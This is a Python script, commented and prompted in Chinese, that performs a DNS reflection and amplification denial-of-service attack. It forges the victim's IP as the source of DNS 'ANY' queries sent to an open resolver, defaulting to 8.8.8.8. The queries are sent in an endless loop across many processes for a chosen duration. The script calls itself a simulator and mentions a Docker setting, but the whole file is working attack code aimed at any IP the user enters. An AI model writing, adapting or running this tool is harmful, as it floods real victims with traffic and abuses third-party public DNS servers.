import random
import time
import os
from multiprocessing import Process, cpu_count
from scapy.all import IP, UDP, DNS, DNSQR, send

# ==============================================================================
# 核心功能模块
# ==============================================================================

def get_user_input(prompt, default_value, value_type=str):
    """
    一个通用的函数，用于获取用户输入，并提供默认值和类型转换。
    """
    while True:
        user_input = input(f"{prompt} (默认为: {default_value}): ").strip()
        if not user_input:
            return default_value
        try:
            return value_type(user_input)
        except ValueError:
            print(f"输入无效，请输入一个有效的 {value_type.__name__} 类型的值。")

def amplify_worker(target_ip, dns_server, domain):
    """
    攻击工作单元，在独立的进程中运行。
    它会伪造源IP为受害者IP，向DNS服务器发送查询。
    """
    print(f"进程 {os.getpid()} 已启动，将通过 {dns_server} 放大攻击至 {target_ip}...")
    
    # 构造一个DNS "ANY" 查询，这通常会返回最大的响应包
    # 关键点：IP(src=target_ip, dst=dns_server)
    # 这会告诉Scapy在构造IP包时，将源IP地址设置为受害者的IP
    packet = IP(src=target_ip, dst=dns_server) / UDP(sport=random.randint(1025, 65534), dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype='ANY'))
    
    while True:
        try:
            # 循环发送伪造的DNS查询请求
            send(packet, verbose=0)
        except Exception as e:
            # 在高负载下可能会出错，忽略并继续
            # Scapy在某些系统上以非root权限运行时可能会有权限问题
            # 在我们的Docker环境中，这通常不是问题
            pass

# ==============================================================================
# 主程序入口
# ==============================================================================

if __name__ == "__main__":
    print("--- DNS 放大攻击模拟器 (交互模式) ---")
    print("此工具通过伪造源IP向DNS服务器发送请求，将响应流量导向受害者。")
    print("警告：此脚本需要root权限才能伪造IP地址。在Docker容器内通常已满足。")
    print("-" * 40)

    # 1. 获取用户输入的参数
    target_ip = get_user_input("请输入受害者IP地址", "target")
    dns_server = get_user_input("请输入用于放大的开放DNS服务器IP", "8.8.8.8")
    domain = get_user_input("请输入用于查询的域名 (以获取大的响应)", "isc.org")
    process_count = get_user_input("请输入要启动的攻击进程数", cpu_count(), int)
    duration = get_user_input("请输入攻击持续时间 (秒, 0为无限)", 60, int)

    print("-" * 40)
    print("攻击参数确认:")
    print(f"  - 受害者 (Target): {target_ip}")
    print(f"  - 反射器 (Reflector): {dns_server}")
    print(f"  - 查询域名: {domain}")
    print(f"  - 进程数: {process_count}")
    print(f"  - 持续时间: {'无限' if duration == 0 else f'{duration} 秒'}")
    print("-" * 40)

    confirm = input("确认开始攻击? (y/n): ").lower()
    if confirm != 'y':
        print("攻击已取消。")
        exit()

    # 2. 启动攻击进程
    processes = []
    print(f"正在启动 {process_count} 个攻击进程...")
    for _ in range(process_count):
        p = Process(target=amplify_worker, args=(target_ip, dns_server, domain))
        p.start()
        processes.append(p)

    # 3. 管理攻击时长并结束
    try:
        if duration > 0:
            print(f"攻击将持续 {duration} 秒... 按 Ctrl+C 可提前终止。")
            time.sleep(duration)
        else:
            print("攻击已开始，将无限期运行... 按 Ctrl+C 终止。")
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n检测到手动中断...")
    finally:
        print("正在停止所有攻击进程...")
        for p in processes:
            p.terminate()
            p.join()
        print("所有攻击进程已停止。程序退出。")
